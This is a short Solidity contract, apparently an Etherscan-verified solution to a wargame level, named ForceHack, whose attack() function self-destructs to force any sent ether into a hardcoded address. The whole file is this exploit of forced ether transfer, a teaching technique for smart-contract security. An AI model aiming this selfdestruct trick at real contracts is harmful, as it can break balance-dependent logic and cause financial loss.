/**
 *Submitted for verification at Etherscan.io on 2022-03-14
*/

pragma solidity ^0.6.0;

contract ForceHack{
    address payable attackAddress = 0x1ed75B910677bBE12EBEA6900C60094DA49B30A8;

    function attack() public payable {
        require(msg.value > 0 ether, "please send ether");
        selfdestruct(attackAddress); 
    }
}